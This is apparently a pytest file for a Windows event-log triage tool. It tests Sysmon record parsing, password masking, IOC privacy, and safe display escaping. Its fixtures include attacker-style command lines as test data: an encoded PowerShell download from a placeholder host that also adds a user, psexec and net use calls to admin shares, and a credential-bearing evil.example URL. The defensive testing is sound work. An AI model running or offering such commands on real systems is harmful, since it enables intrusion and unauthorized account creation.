"""Reading .evtx files, hiding passwords, keeping private data private, and never crashing the page.
Every name here is made up (LAB-PC01, analyst, example domains)."""

from tests.fixtures.events import USER, event
from tests.helpers import PS
from triage.checks import run_checks
from triage import parse
from triage.parse import event_from_xml


# ---------- reading events ----------

def test_event_from_xml_reads_fields_and_skips_other_providers():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>42</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="UtcTime">2026-01-05 09:00:00.120</Data><Data Name="Image">C:\\a.exe</Data>'
           '<Data Name="CommandLine"></Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert parsed == {"record_id": 42, "event_id": 1, "computer": "LAB-PC01",
                      "time": "2026-01-05 09:00:00.120", "UtcTime": "2026-01-05 09:00:00.120",
                      "Image": "C:\\a.exe", "CommandLine": ""}
    assert event_from_xml(xml.replace("Microsoft-Windows-Sysmon", "Microsoft-Windows-Security-Auditing")) is None


def test_one_damaged_record_does_not_stop_the_file(monkeypatch):
    good_xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
                '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
                '<TimeCreated SystemTime="2026-01-05 09:00:0{n}.000000+00:00"/><EventRecordID>{n}</EventRecordID>'
                '<Computer>LAB-PC01</Computer></System><EventData>'
                '<Data Name="UtcTime">2026-01-05 09:00:0{n}.000</Data><Data Name="Image">C:\\a.exe</Data>'
                '</EventData></Event>')

    class FakeParser:  # stands in for evtx.PyEvtxParser: records() gives dicts with the XML in "data"
        def __init__(self, path):
            pass

        def records(self):
            damaged = "<Event><System>half a record"  # XML that cannot be read
            return [{"data": good_xml.format(n=1)}, {"data": damaged}, {"data": good_xml.format(n=3)}]

    monkeypatch.setattr(parse, "PyEvtxParser", FakeParser)
    assert [e["record_id"] for e in parse.read_evtx("any.evtx")] == [1, 3]


def sysmon_xml(n, time):
    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
            '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
            f'<TimeCreated SystemTime="{time}"/><EventRecordID>{n}</EventRecordID>'
            '<Computer>LAB-PC01</Computer></System><EventData>'
            f'<Data Name="Image">C:\\a.exe</Data></EventData></Event>')


def test_an_event_with_a_broken_time_is_skipped(monkeypatch):
    from triage import parse

    class FakeParser:
        def __init__(self, path):
            pass

        def records(self):
            return [{"data": sysmon_xml(1, "2026-02-01 09:00:00.000000+00:00")},
                    {"data": sysmon_xml(2, "not a time")}]

    monkeypatch.setattr(parse, "PyEvtxParser", FakeParser)
    assert [e["record_id"] for e in parse.read_evtx("any.evtx")] == [1]


def test_a_reader_error_keeps_the_events_read_so_far(monkeypatch):
    from triage import parse

    def records():
        yield {"data": sysmon_xml(1, "2026-02-01 09:00:00.000000+00:00")}
        raise RuntimeError("the file is cut off")

    class FakeParser:
        def __init__(self, path):
            pass

        def records(self):
            return records()

    monkeypatch.setattr(parse, "PyEvtxParser", FakeParser)
    events, damaged = parse.read_evtx_with_status("any.evtx")
    assert [e["record_id"] for e in events] == [1] and damaged is True


# ---------- password hiding ----------

def test_passwords_are_hidden():
    hide = parse.hide_secrets
    assert hide(r"net use \\pc02\c$ Secret1 /user:lab\admin") == r"net use \\pc02\c$ **** /user:lab\admin"
    assert hide(r"net use z: \\pc02\share Secret1") == r"net use z: \\pc02\share ****"
    assert hide(r"net use \\pc02\c$ /user:lab\admin") == r"net use \\pc02\c$ /user:lab\admin"  # no password
    assert hide("psexec \\\\pc02 -u admin -p Secret1 cmd") == "psexec \\\\pc02 -u admin -p **** cmd"
    assert hide("tool.exe /p:Secret1 /x") == "tool.exe /p:**** /x"
    assert hide("tool.exe --password=Secret1") == "tool.exe --password=****"
    assert hide("New-Thing -Password 'Secret 1' -Force") == "New-Thing -Password **** -Force"
    assert hide('schtasks /create /tn T /ru admin /rp "Secret 1"') == "schtasks /create /tn T /ru admin /rp ****"
    assert hide("Server=db01;Database=x;Pwd=Secret1;") == "Server=db01;Database=x;Pwd=****;"
    assert hide("net user helpdesk Pa55-word! /add") == "net user helpdesk **** /add"
    assert hide('"C:\\Windows\\System32\\net.exe" user "help desk" Secret1') == \
        '"C:\\Windows\\System32\\net.exe" user "help desk" ****'
    for text in ["net user helpdesk /add", "net user helpdesk * /add", "net user /domain",
                 "net user helpdesk", "net user"]:  # no password written: nothing to hide
        assert hide(text) == text, text
    # Normal command lines are left alone.
    for text in ["powershell.exe -enc SQBFAFgA", "C:\\Program Files\\App\\app.exe /S", "whoami /priv",
                 "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",  # -p without a value
                 "C:\\Users\\analyst\\AppData\\Local\\Temp\\FireEye.exe -foobar"]:
        assert hide(text) == text


def test_passwords_are_hidden_when_events_are_read():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>7</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="CommandLine">net use \\\\pc02\\c$ Secret1 /user:admin</Data>'
           '<Data Name="ParentCommandLine">cmd.exe /c psexec -p Secret1</Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert "Secret1" not in str(parsed)
    assert parsed["CommandLine"] == "net use \\\\pc02\\c$ **** /user:admin"


def test_password_in_decoded_powershell_is_hidden():
    import base64
    script = "iwr http://x.example/a; net user bob Winter2026! /add"
    command = "powershell -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, CommandLine=command)]
    findings = run_checks(events)
    assert findings and all("Winter2026!" not in f["detail"] for f in findings)
    assert "net user bob ****" in findings[0]["detail"]


def test_more_password_forms_are_hidden():
    from triage.parse import hide_secrets
    # r"..." = a raw string: a backslash is just a backslash, as in a Windows command line.
    assert hide_secrets(r"net use \\srv\c$ /user:admin Secret1") == r"net use \\srv\c$ /user:admin ****"
    assert hide_secrets(r"net use z: \\srv\d /user:admin /persistent:no") == \
        r"net use z: \\srv\d /user:admin /persistent:no"           # no password: nothing hidden
    assert hide_secrets(r"7z.exe x a.zip -pSecret1 -oC:\out") == r"7z.exe x a.zip -p**** -oC:\out"
    assert hide_secrets("mysql -u root -pSecret1 -P3306") == "mysql -u root -p**** -P3306"
    assert hide_secrets("tar -pxf a.tar") == "tar -pxf a.tar"         # other tools: -p is not a password
    assert hide_secrets("curl https://bob:Secret1@files.example.com/a") == \
        "curl https://bob:****@files.example.com/a"
    assert hide_secrets("curl -u bob:Secret1 https://x.example.com") == "curl -u bob:**** https://x.example.com"
    assert hide_secrets("Sysmon64.exe -u force") == "Sysmon64.exe -u force"


# ---------- IOC privacy ----------

def test_url_host_drops_user_password_and_port():
    from triage.iocs import url_host
    assert url_host("https://john.doe:Secr3t@evil.example.com:8080/x") == "evil.example.com"
    assert url_host("http://1.2.3.4/a") == "1.2.3.4"
    assert url_host("http://[broken/") == ""


def test_url_with_a_login_gives_the_real_host_as_domain_ioc():
    from triage.iocs import extract_iocs
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{d}", Image=USER + r"\Downloads\d.exe",
                    CommandLine="d.exe https://john.doe:Secr3t@evil.example.com/x")]
    domains = [i["value"] for i in extract_iocs(events, run_checks(events)) if i["type"] == "domain"]
    assert domains == ["evil.example.com"]


def test_parent_domain_of_the_organisation_stays_private():
    from triage.iocs import check_shareable
    names = {"pc01.ad.contoso.com"}
    assert check_shareable("domain", "vpn.contoso.com", names) != ""
    assert check_shareable("domain", "contoso.com", names) != ""
    assert check_shareable("domain", "evil.com", names) == ""
    # co.uk keeps three labels: other .co.uk companies are still shareable.
    assert check_shareable("domain", "other.co.uk", {"pc01.ad.example.co.uk"}) == ""
    assert check_shareable("domain", "mail.example.co.uk", {"pc01.ad.example.co.uk"}) != ""


# ---------- the page never crashes ----------

def test_backend_answers_with_empty_fields_are_not_enriched_and_not_cached(monkeypatch):
    from triage import enrich
    assert enrich.read_hash_answer(200, {"verdict": {"label": None, "score": 1}})["status"] == "not enriched"
    assert enrich.read_ip_answer(200, {"verdict": {"level": 5, "score": 1}})["status"] == "not enriched"
    assert enrich.read_domain_answer(200, {"assessment": {"verdict": ""}})["status"] == "not enriched"
    error = enrich.read_hash_answer(500, {"error": None})
    assert error["status"] == "not enriched" and error["note"] == "hash backend answered HTTP 500"

    class Answer:
        status_code = 200

        def json(self):
            return {"verdict": {"label": None, "score": 1}}

    monkeypatch.setattr(enrich.SESSION, "get", lambda url, timeout: Answer())
    ioc = {"type": "sha256", "value": "a" * 64, "enrich": True, "why_not": ""}
    assert enrich.enrich_one(ioc)["note"] == enrich.UNEXPECTED
    assert ("sha256", "a" * 64) not in enrich._cache


def test_lookups_ignore_the_computers_proxy_settings():
    from triage import enrich
    assert enrich.SESSION.trust_env is False


def test_esc_shows_markdown_links_and_images_as_text():
    from triage.display import esc
    link = esc("[Click](https://evil.example/x)")
    image = esc("![x](http://1.2.3.4/p)")
    for shown in (link, image):
        assert "[" not in shown and "](" not in shown and "!" not in shown
    assert "<code>https://evil.example/x" in link
    assert esc("https://a.example/x_y z") == "<code>https://a.example/x&#95;y</code> z"   # the URL stays whole
    assert esc("<b>a</b>\nb $x$") == "&lt;b&gt;a&lt;/b&gt;<br>b &#36;x&#36;"
